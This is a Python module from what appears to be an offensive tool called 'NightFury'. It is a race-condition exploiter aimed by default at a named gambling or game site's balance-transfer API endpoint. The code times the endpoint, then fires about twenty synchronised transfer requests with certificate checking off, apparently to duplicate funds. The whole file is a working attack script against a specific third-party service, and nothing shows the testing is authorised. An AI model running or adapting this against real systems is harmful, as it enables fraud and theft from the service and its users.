"""
NightFury Framework - Race Condition Exploitation Framework
Automated timing window detection and multi-threaded race condition exploitation.
"""

import threading
import time
import requests
import logging
import concurrent.futures
from typing import List, Dict, Optional, Callable
from datetime import datetime
from core.base_module import BaseModule

logger = logging.getLogger(__name__)

class RuneHallRaceConditionExploiter(BaseModule):
    """
    Advanced framework for detecting and exploiting race conditions.
    Specifically designed for financial transactions and game logic.
    """
    
    def __init__(self, framework):
        super().__init__(framework)
        self.name = "runehall_race_conditions"
        self.description = "Automated timing window detection and multi-threaded race condition exploitation."
        self.options = {
            "target": "https://api.runehall.com",
            "endpoint": "/v1/user/balance/transfer",
            "thread_count": 20,
            "amount": 10.0,
            "from_account": "user1",
            "to_account": "user2"
        }
        
    def run(self, args):
        target_url = self.options.get("target")
        endpoint = self.options.get("endpoint")
        thread_count = int(self.options.get("thread_count"))
        
        self.log(f"Initializing Race Condition Testing on {target_url}{endpoint}")
        
        # Test timing window first
        payload = {
            "from": self.options.get("from_account"),
            "to": self.options.get("to_account"),
            "amount": float(self.options.get("amount"))
        }
        
        self.log("Testing timing window...")
        timing = self.test_timing_window(target_url, endpoint, payload)
        self.log(f"Timing Results: {timing}")
        
        self.log(f"Executing race with {thread_count} threads...")
        results = self.execute_race(target_url, endpoint, payload, thread_count)
        
        success_count = sum(1 for r in results if r.get("status_code") == 200)
        self.log(f"Operation Complete. Successes: {success_count}/{len(results)}")

    def test_timing_window(self, target_url, endpoint, payload, iterations: int = 5) -> Dict:
        url = f"{target_url}{endpoint}"
        latencies = []
        
        for i in range(iterations):
            start_time = time.perf_counter()
            try:
                # Perform actual request
                response = requests.post(url, json=payload, timeout=5, verify=False)
                latencies.append(time.perf_counter() - start_time)
            except Exception as e:
                self.log(f"Request failed: {e}", "error")
                
        if not latencies:
            return {"error": "No successful requests"}
            
        return {
            "min_latency": min(latencies),
            "max_latency": max(latencies),
            "avg_latency": sum(latencies) / len(latencies)
        }

    def execute_race(self, target_url, endpoint, payload, thread_count: int = 20) -> List[Dict]:
        url = f"{target_url}{endpoint}"
        responses = []
        barrier = threading.Barrier(thread_count)
        
        def worker():
            try:
                barrier.wait(timeout=5)
                # Perform actual request
                resp = requests.post(url, json=payload, timeout=10, verify=False)
                responses.append({"status_code": resp.status_code, "timestamp": time.time()})
            except Exception as e:
                responses.append({"error": str(e)})

        threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=worker)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
            
        return responses

if __name__ == "__main__":
    # Standalone test
    class MockFramework:
        def log(self, msg, level="info"): print(f"[{level.upper()}] {msg}")
    
    module = RuneHallRaceConditionExploiter(MockFramework())
    module.run([])
